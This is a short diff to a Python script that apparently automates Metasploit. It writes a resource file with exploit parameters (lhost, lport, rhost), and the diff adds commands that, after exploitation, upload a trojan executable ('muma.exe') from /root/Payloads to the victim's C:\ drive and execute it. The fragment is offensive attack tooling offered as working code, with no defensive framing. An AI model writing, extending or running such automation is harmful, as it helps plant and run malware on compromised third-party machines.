@@ -28,7 +28,12 @@ def Handler(configFile, lhost, lport, rhost):  #漏洞利用参数
 
     configFile.write('exploit\n')
 
+    configFile.write('upload /root/Payloads/muma.exe c:\\ \n')
+
+    configFile.write('execute -f c:\\muma.exe')
+
     configFile.write('spool off\n')
+
 
 def writedb():  #msf日志文件路径存库
     a = os.getcwd()  # 获取当前路径
